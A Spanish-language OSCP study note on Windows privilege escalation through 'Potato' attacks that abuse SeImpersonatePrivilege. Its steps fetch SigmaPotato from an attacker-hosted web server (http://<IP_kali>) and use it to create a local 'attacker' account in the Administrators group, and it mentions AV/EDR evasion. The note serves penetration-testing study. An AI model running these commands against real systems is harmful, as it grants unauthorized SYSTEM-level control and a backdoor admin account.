---
tipo: tecnica
fase: privesc
so: windows
tags: [oscp, tecnica, privesc, windows]
fecha: 2026-10-08
---

# Potato Attacks (SeImpersonate)

> [!abstract] Qué es y cuándo usarla
> Si el user actual tiene habilitado `SeImpersonatePrivilege` (típico en cuentas de servicio: IIS, SQL Server, `LocalService`, `NetworkService`, `ApplicationPoolIdentity`), puede impersonar a cualquier cliente que se conecte a un **named pipe** tras autenticarse. Las herramientas "Potato" fuerzan a un servicio que corre como **SYSTEM** a conectarse a un pipe controlado por el atacante, que entonces hereda ese contexto → SYSTEM.

## Requisitos previos
- `whoami /priv` → `SeImpersonatePrivilege` habilitado (`Enabled`).
- Descargar la variante de Potato adecuada a la versión de Windows del objetivo (RottenPotato, JuicyPotato, SweetPotato, GodPotato, SigmaPotato — varían en compatibilidad según versión/parches).

## Pasos
```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```
```powershell
whoami /priv                                              # confirmar SeImpersonatePrivilege
iwr -uri http://<IP_kali>/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato "net user attacker Password123! /add"
.\SigmaPotato "net localgroup Administrators attacker /add"
```

> [!warning] Detección / problemas
> - No todas las variantes de Potato funcionan en todas las versiones de Windows (Microsoft ha ido parcheando el abuso de DCOM/BITS que usan las más antiguas) — probar varias si una falla.
> - El privilegio es habitual en cuentas de servicio/IIS, poco en cuentas de usuario normales en un pentest real.
> - Los binarios de estas herramientas son muy firmados por AV/EDR; considerar evasión (ver [[15 - Antivirus Evasion]]) si el entorno lo tiene activo.

## Visto en
- Módulo: [[17 - Windows Privilege Escalation]]
- Relacionado: [[Mimikatz]]
- Máquinas: [[]]
